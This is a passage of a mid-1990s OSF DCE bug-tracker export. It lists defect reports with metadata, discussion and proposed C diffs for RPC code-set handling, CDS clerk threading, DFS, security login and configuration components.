      [/vob/dce/src/admin/tcl_dce/tclVar.c: 2057]
 5 Tcl_SetVar2 (interp = 0x4002cf70, part1 = 0x7b03afdc, part2 = 0x7b03afe0,
                newValue = 0x7b03afe3, flags = 512)
      [/vob/dce/src/admin/tcl_dce/tclVar.c: 614]
 6 Tcl_SetVar (interp = 0x4002cf70, varName = 0x7b03afdc, newValue = 0x7b03afe3,
               flags = 512)
      [/vob/dce/src/admin/tcl_dce/tclVar.c: 453]
 7 Tcl_SetCmd (dummy =   00000000, interp = 0x4002cf70, argc = 3, argv = 0x7b03b0b8)
      [vob/dce/src/admin/tcl_dce/tclVar.c: 1289]
 8 Tcl_Eval (interp = 0x4002cf70, cmd = 0x7b03a3c0)
      [/vob/dce/src/admin/tcl_dce/tclBasic.c: 1103]
 9 Tcl_RecordAndEval (interp = 0x4002cf70, cmd = 0x7b03a3c0, flags = 0)
      [/vob/dce/src/admin/tcl_dce/tclHistory.c: 282]
10 main (argc = 1, argv = 0x7b03a264)
      [/vob/dce/src/admin/dcecp/main.c: 682]
>



CR Number                     : 13300
Defect or Enhancement?        : def
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : all
Component Name                : dfs
Subcomponent Name             : 
Short Description             : upgrade DFS service msgs
Reported Date                 : 2/6/96
Found in Baseline             : 1.2
Found Date                    : 2/6/96
Severity                      : D
Priority                      : 3
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.2
Fixed In Baseline             : 
Affected File(s)              : 
Sensitivity                   : public

[2/6/96 public]

By code inspection we notice that the DFS service messages are
not always uptodate. In this defect all the DFS service messages
are to be updated.



CR Number                     : 13292
Defect or Enhancement?        : def
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : all
Component Name                : sec
Subcomponent Name             : login
Short Description             : Remove resetpag() stub from security when available in DFS
Reported Date                 : 1/26/96
Found in Baseline             : 1.2.1
Found Date                    : 1/26/96
Severity                      : B
Priority                      : 3
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.2
Fixed In Baseline             : 
Affected File(s)              : security/client/login/sec_login_pvt.c
Sensitivity                   : public

[1/26/96 public]

The function resetpag() is defined as stub. Remove that once its
included in new DFS code.

Meanwhile, workaround is to define a dummy function doing nothing.



CR Number                     : 13288
Defect or Enhancement?        : def
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : all
Component Name                : rpc
Subcomponent Name             : 
Short Description             : rpc_rgy_get_codesets() return wrong info for current codeset
Reported Date                 : 1/23/96
Found in Baseline             : 1.1
Found Date                    : 1/23/96
Severity                      : D
Priority                      : 3
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.2
Fixed In Baseline             : 
Affected File(s)              : 
Diff supplied by              : 
Diff release                  : 
Sensitivity                   : public

[1/23/96 public]

When the current locale's code set is the last one in
the code set registry data base, which is sorted by the code set
values, the code set informations such as max_bytes were not copied
correctly to the code sets array returned by rpc_rgy_codesets().

Following is the diff in cs_s_reg.c for fixing this bug:

921c921
< 	int		i,k;
---
> 	int		i;
965,967c965
< 	for (i = 1, k = 1;
< 	     (i < rpc_g_codesets_effective_count) || (k == rpc_g_codesets_effective_count);
< 	     i++)
---
> 	for (i = 1; i < rpc_g_codesets_effective_count; i++)


This OT defect corresponds to IBM cmvc 18320.


I left out k++; in the fix.



CR Number                     : 13287
Defect or Enhancement?        : def
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : all
Component Name                : rpc
Subcomponent Name             : 
Short Description             : Code set registry data can not be reread
Reported Date                 : 1/23/96
Found in Baseline             : 1.1
Found Date                    : 1/23/96
Severity                      : D
Priority                      : 3
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.2
Fixed In Baseline             : 
Affected File(s)              : 
Sensitivity                   : public

[1/23/96 public]


rpc_codesets_really_read_file() is the internal routine to read the code set registry
data into memory.  It uses a local global flag: rpc_g_codesets_did_read
to determine whether the code set registry data has been read.  This
flag is set to TRUE when code set registry is first accessed so 
that the data is read only once to avoid the overhead.  This flag
was not initialized, therefore, even the code set registry data file was changed,
the new file did not get opened.

The variable "rpc_g_codesets_did_read" needs be initialized to 0.
Following is the diff in cs_s_reg.c for this defect.

69c69
< static boolean		rpc_g_codesets_did_read = FALSE;  /* CMVC 18144 */
---
> static boolean		rpc_g_codesets_did_read;

This defect corresponds to IBM cmvc 18144.

[01/24/96 public]
According to the definition ofthe C language, uninitialized data is
defined to be zero.  So the two statements are equivalent.  Perhaps
there is a bug in your C compiler?  This defect can be cancelled.



CR Number                     : 13285
Defect or Enhancement?        : def
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : all
Component Name                : rpc
Subcomponent Name             : 
Short Description             : Unitialized variable in cs_s_stub.c
Reported Date                 : 1/22/96
Found in Baseline             : 1.1
Found Date                    : 1/22/96
Severity                      : D
Priority                      : 3
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.2.2
Fixed In Baseline             : 
Affected File(s)              : 
Sensitivity                   : public

[1/23/96 public]
Variable "tags_p" is not initialized in all instances within the
function "rpc_cs_get_tags" prior to it being utilized.



CR Number                     : 13284
Defect or Enhancement?        : def
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 13170
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : all
Component Name                : rpc
Subcomponent Name             : 
Short Description             : Incorrect rtn stat check in cs_s_conv.c
Reported Date                 : 1/22/96
Found in Baseline             : 1.1
Found Date                    : 1/22/96
Severity                      : D
Priority                      : 3
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.2.2
Fixed In Baseline             : 
Affected File(s)              : 
Sensitivity                   : public

[1/23/96 public]
This defect is in the same general code area within cs_s_conv.c 
as OT13170.

The return status check from the iconv() call is incorrect, based on
the XPG/4 specification.  According to XPG/4, if the call to iconv()
fails, as -1 will be returned and errno will be set.  In addition,
a successful conversion mandates that inbytesleft is set to zero; a
non-zero value indicates that iconv() was unable to convert the 
entire contents of the buffer.  Both of these return values should
checked upon return from iconv().

Also, as a point of code-cleanliness, inbytesleft and outbytesleft
should be defined as size_t's.

Here is a diff of the changes within cs_s_conv.c, including those
modifications noted for OT13170:

-----[94-95 changed to 94-95]-----
<       int                     inbytesleft;
<       int                     outbytesleft;
---
>       size_t                  inbytesleft;
>       size_t                  outbytesleft;
-----[135 changed to 135-140]-----
<       if (i_ret)      /* Iconv returns zero when it succeed */
---
>       /* Check return value and inbytesleft for any possible iconv errors
>        * per XPG/4 (CHFts17316) and fix conditional statements logic
>        * errors (OT13170 / CHFts17320).
>        */
>
>       if ((i_ret == -1) || (inbytesleft != 0))
-----[139 changed to 144]-----
<               else if (errno = E2BIG)
---
>               else if (errno == E2BIG)
-----[141 changed to 146]-----
<               else if (errno = EINVAL)
---
>               else if (errno == EINVAL)

[1/22/96 public]
Changed component from sec to rpc...clicked on the wrong WWW template
button when submitting OT.



CR Number                     : 13283
Defect or Enhancement?        : def
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : hppa
S/W Ref Platform              : hpux
Component Name                : rpc
Subcomponent Name             : idl
Short Description             : don't generate volatile casts
Reported Date                 : 1/19/96
Found in Baseline             : 1.1
Found Date                    : 1/19/96
Severity                      : E
Priority                      : 4
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 
Fixed In Baseline             : 
Affected File(s)              : 
Sensitivity                   : public

[1/19/96 public]

idl generates lines like the following in at least _sstub.c's

  IDL_ms.IDL_call_h = (volatile rpc_call_handle_t)IDL_call_h;

The c89 compiler generates warnings for each instance:

c89 +w1 -g -I../include -I../idl -I. -D_HPUX_SOURCE  -D_NEED_ACL_LIB   -c wandmgmt_sstub.c -o wandmgmt_sstub.o
cc: "wandmgmt_sstub.c", line 925: warning 568: When casting to a qualified type, the qualifier is ignored.
cc: "wandmgmt_sstub.c", line 1093: warning 568: When casting to a qualified type, the qualifier is ignored.
cc: "wandmgmt_sstub.c", line 1263: warning 568: When casting to a qualified type, the qualifier is ignored.
cc: "wandmgmt_sstub.c", line 1433: warning 568: When casting to a qualified type, the qualifier is ignored.
cc: "wandmgmt_sstub.c", line 1602: warning 568: When casting to a qualified type, the qualifier is ignored.
cc: "wandmgmt_sstub.c", line 1771: warning 568: When casting to a qualified type, the qualifier is ignored.
cc: "wandmgmt_sstub.c", line 1944: warning 568: When casting to a qualified type, the qualifier is ignored.
cc: "wandmgmt_sstub.c", line 2116: warning 568: When casting to a qualified type, the qualifier is ignored.
cc: "wandmgmt_sstub.c", line 2286: warning 568: When casting to a qualified type, the qualifier is ignored.
cc: "wandmgmt_sstub.c", line 2457: warning 568: When casting to a qualified type, the qualifier is ignored.
cc: "wandmgmt_sstub.c", line 2628: warning 568: When casting to a qualified type, the qualifier is ignored.
cc: "wandmgmt_sstub.c", line 2795: warning 568: When casting to a qualified type, the qualifier is ignored.

Change the cast to remove the "volatile" qualifier.



CR Number                     : 13282
Defect or Enhancement?        : def
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : rs6000
S/W Ref Platform              : aix
Component Name                : dfs
Subcomponent Name             : episode
Short Description             : not zero-filling unused file blocks
Reported Date                 : 1/17/96
Found in Baseline             : 1.2
Found Date                    : 1/17/96
Severity                      : C
Priority                      : 2
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.2
Fixed In Baseline             : 
Affected File(s)              : 
Sensitivity                   : public

[1/17/96 public]
This defect was opened brought to our attention by Carl Burnett @ IBM.
        <Note by brich (Rich, Bruce), 96/01/09 17:20:43, action: open>
    An OS/2 DFS client can read data off an
    AIX DFS server simply by creating a file
    of arbitrary length, closing the file and
    then re-opening and reading from it. This
    pattern should result in zeroes being
    returned from the server.
 
        Carl added:
    Customers who have applications which set a file's
    length up from a value smaller than 8K to a value
    smaller than 8K without ever writing data
    in the file.
        and
    This problem can be created by a simple test case which:
 
    creates a new file
    sets the length to say 1024 bytes
    then exits without ever writing any data.

Carl has provided Transarc with a fix.



CR Number                     : 13280
Defect or Enhancement?        : def
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : hppa
S/W Ref Platform              : hpux
Component Name                : rpc
Subcomponent Name             : uuidgen
Short Description             : include UL suffix on uuidgen -s
Reported Date                 : 1/15/96
Found in Baseline             : 1.1
Found Date                    : 1/15/96
Severity                      : D
Priority                      : 3
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 
Fixed In Baseline             : 
Affected File(s)              : 
Sensitivity                   : public

[1/15/96 public]

$ uuidgen -s
= { /* 138db29a-4fa6-11cf-bced-080009251352 */
    0x138db29a, 0x4fa6, 0x11cf, 0xbc, 0xed,
    { 0x08, 0x00, 0x09, 0x25, 0x13, 0x52 }
};

The first value (0x138db29a above) should have a UL suffix to stop the
compiler warnings from c89 on HP/UX:

cc: "dce-acl.c", line 12: warning 700: ANSI migration: large unsuffixed integer constants will not be of type long in ANSI mode.



CR Number                     : 13277
Defect or Enhancement?        : def
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : all
Component Name                : sec
Subcomponent Name             : pgo idl file
Short Description             : pgo.idl sec_rgy_pgo_get_members desc wrong.
Reported Date                 : 1/9/96
Found in Baseline             : 1.1
Found Date                    : 1/9/96
Severity                      : E
Priority                      : 4
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.2
Fixed In Baseline             : 1.1maint
Affected File(s)              : src/security/idl/pgo.idl
Diff supplied by              : 
Diff release                  : 
Sensitivity                   : public

[1/9/96 public]

The description in the comments for sec_rgy_pgo_get_members() in pgo.idl
is wrong (implies that it only works for Group and Org domains, but it
also works for Princ domain) (and the title in the comment is wrong; it
calls it rs_pgo_get_members() ).  This is minor, but has confused one
developer already, so it's worth fixing soon.



CR Number                     : 13276
Defect or Enhancement?        : def
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : hpux
Component Name                : sec
Subcomponent Name             : 
Short Description             : TKT rqst for local alias treated as foreign
Reported Date                 : 1/8/96
Found in Baseline             : 1.1
Found Date                    : 5/26/95
Severity                      : B
Priority                      : 2
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 
Fixed In Baseline             : 
Affected File(s)              : 
Sensitivity                   : public

[1/10/96 public]
Ticket requests to alias names for the local privilege server are treated as
foreign cell requests.  At DCE 1.1 the privilege server removes ERAs from
credentials requested by foreign cells.  Therefore the credentials returned by
ticket requests to alias names will not include ERAs.

[1/9/96 public]
Moved the description to the description section and created a reasonable
size short description for the subject header.



CR Number                     : 13275
Defect or Enhancement?        : def
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : all
Component Name                : utils
Subcomponent Name             : ACL library
Short Description             : ACL lib needs pac-based evaluation
Reported Date                 : 1/7/96
Found in Baseline             : 1.1
Found Date                    : 1/7/96
Severity                      : A
Priority                      : 2
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.2
Fixed In Baseline             : 
Affected File(s)              : 
Sensitivity                   : public

[1/7/96 public]

The ACL library needs a routine like
	dce_acl_inq_permset_for_pa
or	dce_acl_inq_permset_for_pac

Servers that use name-based authorization but then ask the DCE registry
for principal data (e.g., those that might wish to accept KRB5 GSSAPI on a
"legacy" port) need this routine.  The dce-web project also needs this
routine, so we might write it:  it seems to be not much more than a
wrapper around the internal dce_acl__permset_alg routine, but we'd like
feedback.



CR Number                     : 13272
Defect or Enhancement?        : def
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : rs6000
S/W Ref Platform              : aix
Component Name                : dts
Subcomponent Name             : 
Short Description             : test_dtscp-server test fails
Reported Date                 : 12/29/95
Found in Baseline             : 1.2.1
Found Date                    : 12/29/95
Severity                      : B
Priority                      : 2
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.2
Fixed In Baseline             : 
Affected File(s)              : 
Sensitivity                   : public

[12/29/95 public]

Found when running DCE 1.2.1 functional tests on AIX 3.2.

From the dtscp_tet.log/journal file:
520|0 1 20649 1 7|Expected output is in file /tmp/test_dtscp_server.exp
520|0 1 20649 1 8|Differences between the two are in file /tmp/test_dtscp.diff
520|0 1 20649 1 9|Compare actual output to expected output
520|0 1 20649 1 10|ERROR: Actual output does not match expected output

Comparing the expected vs. actual files shows that the difference is 
caused by the following -

Expected:
   dtscp show acting courier role
   Acting Courier Role       = Courier
Actual:
   dtscp show acting courier role
   Acting Courier Role       = NonCourier



CR Number                     : 13268
Defect or Enhancement?        : def
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : other
S/W Ref Platform              : osf1
Component Name                : cds
Subcomponent Name             : cdsclerk
Short Description             : cdsclerk dies in alloc_child
Reported Date                 : 12/28/95
Found in Baseline             : 1.1
Found Date                    : 12/28/95
Severity                      : C
Priority                      : 2
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 
Fixed In Baseline             : 
Affected File(s)              : directory/cds/child/clerk_client.c
Sensitivity                   : public

[12/28/95 public]

 Support Subscriber reported the following:

  "The cdsclerk occasionally dies during execution of the test named 
   rpccp_entry.sh The following excerpt from sdb is a stack trace 
   of the offending thread.
 
   *t
   0x24443cd4: kill+0x32(0x34d4, 0x6)
   0x24443d38: raise+0x40(0x6)
   0x24443da8: abort+0x92()
   0x24443e28: alloc_child+0x228(0x2468dc08, 0x0)
   0x24443ea0: clerk_request+0x3a(0x2468dc08)
   0x24443f28: _pthread_body+0x74(0x2403d908)
 
   The test can fail in different places or not at all.

   "Nasty little race condition here.
   Anyway, it happens because clerk_request() does its own call of
   alloc_child().  That's a BAD idea, because if the spawning
   clerk_client thread is cancelled before the new clerk_request() thread
   finishes alloc_child, the clerk_client thread won't have any record of
   its new progeny and won't wait for it to terminate; instead, it will
   simply deallocate *ll_p.  Then, the clerk_request() thread tries to
   use ll_p (not knowing it has been freed) and bad stuff happens.  It
   usually works because the memory isn't reallocated right away and the
   child discovers that it's time to die.   But sometimes the memory has
   been reallocated, and then things really go to pieces."
 
 And proposed the following solution:

   "The solution is to have the *parent* call alloc_child on behalf of its
   (future) offspring, and pass the th_p pointer to the child (which can
   derive ll_p from th_p)"

*** clerk_client.c	Thu Dec 28 13:30:19 1995
--- clerk_client.c.new	Thu Dec 28 13:30:34 1995
***************
*** 136,142 ****
  clerk_client (link_t *);
  
  static dthread_address_t
! clerk_request (link_t *);
  
  static void
  stop_requests (link_t *);
--- 136,142 ----
  clerk_client (link_t *);
  
  static dthread_address_t
! clerk_request (thread_t *);
  
  static void
  stop_requests (link_t *);
***************
*** 424,429 ****
--- 424,430 ----
    dthread_t reqthrd;
    struct sigaction newsig;
    int thstatus, sig_status;
+   thread_t       *th_p = 0;
  
  #if defined(DCE_CDS_DEBUG)
  
***************
*** 472,477 ****
--- 473,480 ----
    dthread_cleanup_push(link_free, ll_p);
  
    while ((ll_p->ll_reqData_p = read_request(ll_p)) != NULL) {
+     
+     if (!th_p) th_p = alloc_child(ll_p, NULL);
  
      if ((thstatus = dthread_lock(&(ll_p->ll_mutex))) < 0)
      {
***************
*** 482,489 ****
  
        if (!ll_p->ll_waiter_p)
  	if (0 <= dthread_create(&reqthrd, &clerk_request_attr,
! 		(dthread_start_routine)clerk_request, (dthread_address_t)ll_p))
  	  (void)dthread_detach(&reqthrd);
  
        {
  
--- 485,494 ----
  
        if (!ll_p->ll_waiter_p)
  	if (0 <= dthread_create(&reqthrd, &clerk_request_attr,
! 		(dthread_start_routine)clerk_request, (dthread_address_t)th_p)) {
  	  (void)dthread_detach(&reqthrd);
+ 	  th_p = 0;
+ 	}
  
        {
  
***************
*** 499,504 ****
--- 504,514 ----
  	dce_svc_printf(CDS_S_PTHREADMUTEXUNLOCK_A_MSG, (long)thstatus);
      }
  
+     if (th_p) {
+       free_child(th_p);
+       th_p = 0;
+     }
+ 
      /*
       * Wait for the bait to be taken
       */
***************
*** 553,567 ****
   *	none
   */
  static dthread_address_t 
! clerk_request (link_t *ll_p)
  { /* st */
      DEB_ASCII_BUF_time_local(exp)
!     thread_t	*th_p = alloc_child(ll_p, NULL);
      register optab_t *op_p;
      time_local_t relTime;
      struct sigaction newsig;
      int thstatus, sig_status;
  
      DCE_SVC_DEBUG((
          cds__svc_handle,
          cds_svc_child,
--- 563,579 ----
   *	none
   */
  static dthread_address_t 
! clerk_request (thread_t *th_p)
  { /* st */
      DEB_ASCII_BUF_time_local(exp)
!     link_t       *ll_p = 0
      register optab_t *op_p;
      time_local_t relTime;
      struct sigaction newsig;
      int thstatus, sig_status;
  
+     if (th_p) ll_p = th_p->link_p;
+ 
      DCE_SVC_DEBUG((
          cds__svc_handle,
          cds_svc_child,
***************
*** 568,574 ****
          svc_c_debug3,
          " >clerk_request(0x%p->%d)",
          ll_p,
!         ll_p->ll_fd));
  
      /*
       * Make sure sigpipe does not stop us.
--- 580,586 ----
          svc_c_debug3,
          " >clerk_request(0x%p->%d)",
          ll_p,
!         ll_p ? ll_p->ll_fd : 0));
  
      /*
       * Make sure sigpipe does not stop us.


I've attempted to reproduce this proble on an running dce1.1, and although I think
I can describe some scenarios which would result in the failure,
I have not been able to reproduce the problem via the rpccp test

I believe rpccp_entry.sh is old and no longer being used to test DCE, since the
test iself has several bugs in it's implementation. I cleaned up the test, and ran it
repeatedly overnight. Other than the fact that my DCE credentials eventually expired,
no problems were encountered.

As mentioned above, I can predict the reported behavior based on an analysis
of the implementation of the clerk_state thread in directory/cds/child/clerk_main.c.

the clerk_state thread starts the listener thread which starts a client thread
each time a connection is accepted by the IPC socket used to communicate between a
clerk and the control programs. Each client thread starts a request thread which
in the current implementation does an alloc_child. 

Once the clerk state thread has created the listener thread, it enters a loop where it
wakes up every minute to decide whether or not conditions are such that it should cancel
the listener thread and thus it's offspring (the pairs of client and request threads
corresponding to each accepted connection). There are four conditions which cause the
clerk state thread to cancel the listener thread.

1. The clerk_state is no longer clerk_On. Based on my analysis, I don't think this will
   ever occur.

2. The cds advertsiser has been shut down, and in doing so, it changed state information
   kept in the memory which it shares with the cds clerks. When eack clerk detects notices
   the change in the value of this state information, it cancels its listener thread.

3. dthread_timed_wait returned a unix error code other than EAGAIN.

4. The clerk has sent 0 requests to the cds server during the 20, 1 minute intervals
   for which the clerk state thread is willing to leave an idle clerk running.

It is possible that either condition 2 (maybe the advertiser gently crashed),
condition 3 (maybe a dts inspired syncronization or some other system phenomenon
is affecting the errno established by dthread_timed_wait), or condition 4, ocurred
precisely in the interval of time beteen when the request thread was created and
alloc_child was completed. I am speculating that any of these scenarios are plausible 
explanations for the (rarely observed) behavior you have encountered.



CR Number                     : 13225
Defect or Enhancement?        : def
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : all
Component Name                : rpc
Subcomponent Name             : 
Short Description             : AES compliant VTS servers
Reported Date                 : 12/16/95
Found in Baseline             : 1.1
Found Date                    : 12/16/95
Severity                      : C
Priority                      : 2
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.2
Fixed In Baseline             : 
Affected File(s)              : 
Sensitivity                   : public

[12/16/95 public]

The following issue has come up regarding AES compliant
VTS servers. I realize that this is a RPC VTS related issue
but I hope to target a wider audience through an rpc related ot.

A support customer has filed 4 VTS tickets with the syseng group.
I am not familiar with the RPC Validation Test Suite or
the AES. I am hoping someone can help me determine an
appropriate response.

It appears that the customer's NT server exhibits different
behavior than the VTS server in certain areas. As a result,
some of the VTS tests are not valid for servers exhibiting
such behavior.

The customer requests that the tests be modified to work with 
their NT implementation. 

The descriptions of how their servers work (4 scenarios)
versus how the DCE VTS test servers work follow this mail. 

I would like to know:

Does the behavior of their NT server conform to the AES?

   If yes, what would be an appropriate course of action? 
	(ie: open a VTS ot against the tests in question)

   If no, then would the appropriate response be,
   " the NT servers are not AES compliant, therefore, some of 
   the VTS tests are not valid for servers exhibiting this 
   behavior". No ot's filed, no VTS changes required.


Much thanks in advance....

	-Anna
	axg@osf.org

---------------------------------------------

Offering and Version: VTS version 1.0.2
Component (Module):   Connection-less server protocol tests
Client Hardware:      DEC  RISC
Client Software:      Ultrix V4.2 (Rev 96)
Server Hardware:      Intel Pentium
Server Software:      Windows NT
Compiler:


-------------------
One Line Description:

    Test lserver 123.


Full Description:

    This test assumes server will send a fault PDU (protocol error)
    if second call is made on same sequence number and activity id.

    NT server drops such packets (assuming that they have been
    resent by a router) and does not send a fault.

    Test is not valid for above implementation.


---------------------
One Line Description:

    Test lserver 128.


Full Description:

    The second call is made on the same activity id as the first call
    (first call fails in the server manager routine due to Divide by Zero
    error).

    VTS expects the server to make a callback for the second call also.
    NT server does not do that since the callback to the first call was
    successful and second call is made on same activity id.


    Test should be changed for such behavior OR second call should be made
    on a different activity id.

    Other tests that need to change include 129, 130, 131, 132, 136, 137,138,
    139, 141-146.


---------------------
One Line Description:

    Test lserver 156.


Full Description:

    VTS sends request as follows - seq0, frag0 , then sends seq1, frag1,
    and then sends seq0, frag1.

    On getting seq1, frag1, NT server assumes that client is restarting
    call with new sequence number, and hence ignores all following sequence 0
    packets as stale packets.

    Test is not valid for servers of above behavior.


-------------------
One Line Description:

    Test lserver 8.


Full Description:

    VTS sends the first fragment in the request as non-idempotent, and the
    rest of the fragments as idempotent.

    NT server assumes that call is non-idempotent, whereas VTS assumes that
    it is idempotent.

    Test should be modified - all fragments should be sent consistently
    - as idempotent/non-idempotent.

[4/19/96 public]

Since I have not checked AES or VTS, the following comment is just
informational.

1) Test lserver 123

Because of the unreliable nature of DG, there is no way to reliably test
the server's behavior unless you hook into the server's runtime. For
instance, a fault pdu maybe lost over the network, or OS networking code
may decide not to send it.

2) Test lserver 128

VTS should not expect the way callback, if the connection is way-validated.

3) Test lserver 156

The NT server seems to be doing the right thing. What's VTS expecting?

4) Test lserver 8

What's VTS testing with invalid pdus?



CR Number                     : 13223
Defect or Enhancement?        : def
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 8148
Project Name                  : dce
H/W Ref Platform              : hppa
S/W Ref Platform              : hpux
Component Name                : thr
Subcomponent Name             : 
Short Description             : fcntl(...,F_SETFL,...) fails
Reported Date                 : 12/7/95
Found in Baseline             : 1.1
Found Date                    : 12/7/95
Severity                      : C
Priority                      : 3
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.2
Fixed In Baseline             : 
Affected File(s)              : 
Sensitivity                   : public

[12/7/95 public]

During code cleanup ;) in cma_fcntl (HP800/cma_thdio_3.c) 

            if (cma__g_file[fd]->non_blocking) {
#ifdef __hpux
                tmp_arg |= O_NONBLOCK;
#else
# ifdef O_NDELAY
                tmp_arg |= O_NDELAY;
# endif
# ifdef _CMA_FNDELAY_
                tmp_arg |= FNDELAY;
# endif
# ifdef O_NONBLOCK
                tmp_arg |= O_NONBLOCK;
# endif
# ifdef _CMA_FNBLOCK_
                tmp_arg |= FNBLOCK;
# endif
#endif                                  /* __hpux */
                }

became

            if (cma__g_file[fd]->non_blocking) {
                tmp_arg |= O_NONBLOCK;
# ifdef O_NDELAY
                tmp_arg |= O_NDELAY;
# endif
# ifdef _CMA_FNDELAY_
                tmp_arg |= FNDELAY;
# endif
# ifdef O_NONBLOCK
                tmp_arg |= O_NONBLOCK;
# endif
# ifdef _CMA_FNBLOCK_
                tmp_arg |= FNBLOCK;
# endif
                }

so that O_NDELAY and O_NONBLOCK are always set in case of a fcntl F_SETFL
which will always fail as HPUX doesn't allow both flags to be set. The fix
is simply to transcribe the 1.0.3 code more carefully as:

            if (cma__g_file[fd]->non_blocking) {
                tmp_arg |= O_NONBLOCK;
               }

By the way, this problem appears to be fixed in an HP-DCE beta I got in
late August.  It would be really nice if serious problems, even platform
specific ones, were reported in OT especially when the platform in question
is a reference platform for the release in which the problem occurs. Now
you can make it a C3.

[12/8/95 public]

Well, it doesn't necessarily mean HP fixed it in its product. Consider the
possibility of HP not using this part of OSF code and never seeing it. :-)
It was OSF owned CMA and testing dce1.1 reference platforms and apparently
there was no test for fcntl(...,F_SETFL,...). Of course, dce1.2.1 is
another story, but HP-UX is not an official referenece platform, anymore.
:^) Just a personal opinion.

[2/9/96 public]
Lowered as requested.



CR Number                     : 13221
Defect or Enhancement?        : def
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : all
Component Name                : sec
Subcomponent Name             : sec_login
Short Description             : Local rgy stale info may be used inappropriately
Reported Date                 : 12/7/95
Found in Baseline             : 1.1
Found Date                    : 12/7/95
Severity                      : C
Priority                      : 1
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.1
Fixed In Baseline             : 
Affected File(s)              : sec_login_pvt.c
Sensitivity                   : public
Transarc Deltas               : cox-OT13221-lrgy-ignore-deleted-users
Transarc Status               : open

[12/7/95 public]
In sec_login_pvt_allocate_login_context:
This function attempts to contact the DCE registry for
sec_id_parse_name, and if it fails, tries to find the named principal
in the local registry.  It seems to me that the reason for this is
that if the network registry is unavailable, we want the function to
succeed anyway (which is entirely reasonable).
However, if a principal has been _deleted_ from the DCE registry, the
function may still succeed because the principal may still be in the
local registry.  It seems to me that if the error returned from
sec_id_parse_name is sec_rgy_object_not_found, the function should not
try the local registry but instead return with that status set.
(I.e., only try the local registry if the network registry is
unavailable.)
The following change should probably take care of it:
*** sec_login_pvt.c~	Mon Dec  4 11:44:02 1995
--- sec_login_pvt.c	Tue Dec  5 16:04:54 1995
***************
*** 2705,2710 ****
--- 2705,2718 ----
                  }
              }
          }
+ 
+ 	/* If the failure was because the principal is not present
+ 	 * in the registry, then don't try the local registry -- he
+ 	 * may have been deleted.  We _do_ want to try it if the
+ 	 * network registry is unavailable, however.
+ 	 */
+ 	if ( stp && *stp == sec_rgy_object_not_found )
+ 	    goto errout;
  
          if (BAD_STATUS(stp)) {
  
Added field Transarc Deltas with value `' 
Added field Transarc Status with value `open'

[1/9/96 public]
Filled in Transarc Deltas with `cox-OT13221-lrgy-ignore-deleted-users'



CR Number                     : 13217
Defect or Enhancement?        : def
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : all
Component Name                : cfg
Subcomponent Name             : 
Short Description             : dce_config and/or rm.dce need to delete 
                                             files for audit
Reported Date                 : 12/5/95
Found in Baseline             : 1.1
Found Date                    : 12/5/95
Severity                      : B
Priority                      : 2
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.2
Fixed In Baseline             : 
Affected File(s)              : dce_config and/or rm.dce
Sensitivity                   : public

[12/5/95 public]
I have discovered that once a configured cell is unconfigured, the
following files need to be removed in order for audit to work properly.
This is because once a cell is unconfigured and re-configured, the 
existing audit ACL file is no longer valid in the new DCE database.  My
proposed solution is to delete them when configuration (dce_config) is  
called.  This will insure that the files are going to be deleted if 
exists regardless rm.dce run successfully or not. 

 1) /opt/dcelocal/var/audit/adm/acl
 2) /opt/dcelocal/var/audit/daemon_binding
 3) /opt/dcelocal/var/audit/daemon_identity

[12/6/95 public]
Corrected the abstract.



CR Number                     : 13216
Defect or Enhancement?        : def
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
